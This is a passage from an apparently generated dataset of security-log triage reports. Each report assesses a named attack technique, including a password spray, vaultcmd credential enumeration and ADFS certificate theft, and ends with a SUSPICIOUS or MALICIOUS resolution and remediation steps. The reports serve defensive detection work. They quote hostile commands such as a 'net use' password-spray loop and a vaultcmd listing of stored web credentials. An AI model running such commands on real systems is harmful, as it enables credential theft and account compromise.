   - There are repeated executions involving `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows command-line utility for querying event logs but can be used for malicious purposes (such as exporting or deleting logs). This requires careful context review to determine the intent.

### Assessment and Resolution:

- **Suspicious Activity Identified:** 
  - The PowerShell script execution accessing the hidden credential directories is highly suspicious and not typical behavior for regular user activities.
  - The frequent use of `wevtutil.exe` under an admin account gives rise to suspicion, as this can be utilized to manipulate event logs. It's imperative to verify whether these actions were authorized by a trusted administrator.

Based on the analysis, the resolution is:

- **Resolution: SUSPICIOUS**

### Recommendations & Next Steps:

1. **Immediate Action:**
   - Investigate the origin and creation of the PowerShell script. Identify if it was created or scheduled during an unauthorized access attempt.
   - Ensure that no unauthorized accounts have accessed or attempted to access the server.

2. **Enhanced Monitoring:**
   - Increase monitoring on the `admin_test` account and any PowerShell activities, especially those interacting with sensitive directories.

3. **Review and Audit:**
   - Conduct a full security audit of the system to ensure no other backdoors or unauthorized changes have been made.
   - Review all recent changes and access logs associated with high-integrity accounts.

4. **Credentials Management:**
   - Evaluate and, if needed, rotate any compromised credentials to prevent potential exploitation.

5. **Awareness and Training:**
   - Conduct training sessions on safe script execution and detection of tricky scripts for all administrators.

The immediate recommendation is to proceed with additional investigation to clarify the intent behind the suspicious activities and mitigate any potential risk to the host."
Password Spray all Domain Users,"The logs provided for investigation contain several entries from Windows Sysmon, System, Security, and Application logs. Below are the key findings and analysis of the logs:

### Detailed Analysis:

1. **Sysmon Logs:**
   - **Execution of `cmd.exe` and Lightweight Processes:**
     - Multiple instances of `cmd.exe` are executed by the user `SERVER002\admin_test` with high integrity level. Commands executed include:
       - Check if a users.txt file exists in the temporary directory.
       - Execution of a batch file `parse_net_users.bat` from a temporary directory.
       - A `FOR` loop to attempt network authentication using `net use` with a hardcoded password (`Spring2020`), which is indicative of potential brute-force or unauthorized access attempts.

   - **Use of `wevtutil.exe`:**
     - Multiple instances of `wevtutil.exe` are being spawned by the same user, which can be an indicator of an attempt to query or modify event logs. This activity combined with `cmd.exe` execution raises alarm for malicious intent.

   - **Low-Level Utility Execution:**
     - Processes like `hostname.exe` and `whoami.exe` are executed. While benign in isolation, they often appear in scripts for system information gathering. Combined with other suspicious activities, these executions may be part of malicious reconnaissance.

2. **Security Logs:**
   - **Privileged Operations:**
     - Admin user `admin_test` has privileges including `SeDebugPrivilege`, `SeBackupPrivilege`, and others, which allow sensitive operations and are often targeted by malware or threat actors for privilege escalation.
   
   - **Logon Events:**
     - The presence of NTLM logon events with successful authentication originating from an IPv6 address logged under `NtLmSsp` indicates possible unauthorized or suspicious access attempts.

3. **System and Application Logs:**
   - **Time Manipulation:**
     - Events indicating system time changes are logged, which could be an attempt to manipulate timestamps to cover tracks during malicious operations.
  
   - **Software Protection Events:**
     - Regular activity from the Software Protection Platform Service, although not immediately malicious, should be investigated if it coincides with suspicious activities.

### Conclusion and Resolution:

Based on the data analyzed:
- The use of command-line tools by a potentially unauthorized admin user is indicative of script activity.
- The presence of tools like `wevtutil.exe` and network enumeration commands without a valid corporate context suggests malicious actions aimed at information gathering or system manipulation.
- The combination of time alteration events, privilege status, and the network logon attempt with a specific password hints at unauthorized or testing activity potentially malicious in nature.

Therefore, the final resolution for the provided logs is: **MALICIOUS**

### Guidance:
- **Immediate Action:** Isolate the affected host (`Server002`) from the network to prevent further potential lateral movement.
- **Detailed Investigation:** Conduct a deeper forensic analysis on `Server002` to identify any additional indicators of compromise, backdoors, or persistence mechanisms not captured in logs.
- **Password Audit:** Ensure any potentially exposed credentials are rotated, especially concerning admin user `admin_test`.
- **Review and Harden Configurations:** Audit server configurations, privileges, and security policies to strengthen defenses against future unauthorized access attempts."
Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials],"Upon reviewing the log entries provided, the following observations and analysis are made to determine if there is any suspicious or malicious activity present:

### Windows PowerShell Log Analysis:
- **Command Observed**: `powershell.exe & {vaultcmd /listcreds:""Web Credentials"" /all}`
- **Details**:
  - The events show PowerShell invoking the `vaultcmd` utility, which is used to list all web credentials stored on the system.
  - **Indicator**: This is not a common administrative action and can often be related to credential harvesting attempts where an unauthorized attempt is made to access stored credentials.
  
### System Log Analysis:
- All entries in the system log reflect normal update activities and time synchronization adjustments which don't present immediate red flags for malicious activity.

### Security Log Analysis:
- **EventID 4616**: Indicates a system time change, which is a standard operation given the corresponding time service events in the System log related to time synchronization.

### Application Log Analysis:
- **Security Center Log**: Windows Defender is on, which suggests at least basic defense mechanisms are active.
- **Edge Update Logs**: The stopping and starting of edge update services appears normal and is expected as part of standard operation or system updates.

### Sysmon Log Analysis:
- **Whoami.exe Execution**: The tool `whoami.exe` was executed, a legitimate Windows utility used to display user information. It's normal, but frequent use without a clear purpose could be suspicious.
- **VaultCmd.exe Execution**: The execution of `VaultCmd.exe` aligns with PowerShell activity to list web credentials, indicating a potential for misuse.
- **Multiple Edge Update Entries**: These entries primarily show activity related to Microsoft Edge updates and don't exhibit suspicious command-line arguments or behaviors that raise suspicion.
  
### Assessment:
- **Suspicious Behavior**: The use of `VaultCmd.exe` via PowerShell to list stored credentials is suspicious, especially without a known legitimate administrative purpose logged or communicated.
- **Malicious Indicators**: Although the command itself is a legitimate use case, in the absence of documented legitimate administrative activity, it suggests potential misuse for credential harvesting.

### Resolution:
Given the identified suspicious activity related to credential access:
- **Resolution**: **SUSPICIOUS** - The logs indicate activity that requires further investigation. There isn't clear-cut proof of unauthorized access or a breach, but the context and command usage indicate a need for additional scrutiny.

**Guidance**: 
1. Validate if the `vaultcmd` execution was authorized and necessary through communication with the system administrator.
2. Conduct a thorough review of any user activity around the command execution time and check for any abnormal login entries or attempts in correlated logs.
3. Increase monitoring of PowerShell activity and commands executed on the system to detect any recurrence of suspicious actions.
4. Additionally, ensure that Windows Defender and any other security measures are updated and configured to detect similar attempts moving forward."
ADFS token signing and encryption certificates theft - Remote,"Based on the analysis of the provided logs, the following observations are noted:

### Security Log:
- Events with `EventID 4616` indicate a change in the system security state, specifically the system time being reset. Although typically benign, it might require context if other suspicious activities occur around the same time.

### Sysmon Log:
1. **EventID 5** indicates processes terminating:
   - The execution of `svchost.exe`, `conhost.exe`, `wevtutil.exe`, and `powershell.exe` are observed with different process IDs.
   
2. **EventID 1** indicates a process creation:
   - Significant execution of `powershell.exe` (ProcessID `6972`). The executed PowerShell command imports the `ActiveDirectory` and `AADInternals` modules, and utilizes DCSync-like capabilities to potentially exfiltrate Active Directory Service Account credentials. This is a clear indication of suspicious, potentially malicious activity due to the nature of the commands.
   - Multiple instances of `MicrosoftEdgeUpdate.exe` related operations show up frequently in the logs. While the presence of `EdgeUpdate` related processes typically suggests routine updates, it requires attention if coupled with unusual behaviors. However, in this context, they are identified as benign.

### Windows PowerShell Log:
- Logged events show the initialization of modules and a comprehensive PowerShell script executing sensitive AD operations. These align with functions capable of harvesting credentials or attempting lateral movement attacks using ADFSCertificates.

### System Log:
- Adjustments to system time and regular updates from `time.windows.com` are logged which can be routine but should be scrutinized if seen with malicious activities.

### Application Log:
- Displays Edge Update service stopping, which appears benign considering its consistency across the logs.

### Conclusion:
The primary cause for concern arises from the PowerShell activity, particularly due to the use of the `AADInternals` module and various AD operations for possible credential extraction and manipulation. The specific command sequence is capable of exporting ADFS tokens or credentials, which is indicative of an advanced attack such as a ""Golden Ticket"" or similar credential theft attempts.

### Assessment:
**Resolution: MALICIOUS**

### Recommendations:
1. **Immediate Action**: Quarantine the affected system (Server002) to prevent further data exfiltration or lateral movement.
2. **Forensic Investigation**: Conduct a full forensic investigation on the server for additional indicators of compromise or persistence mechanisms.
3. **Credential Management**: Reset potentially compromised credentials and enforce MFA (Multi-Factor Authentication) on critical accounts.
4. **Network Monitoring**: Increase monitoring of network traffic for unusual behavior or connections to suspicious domains.
5. **Security Awareness**: Educate relevant personnel about phishing attacks and suspicious PowerShell activities.
   
This analysis should be followed by contacting an incident response team if further malicious activity is suspected or to dissect the event logs with greater granularity."
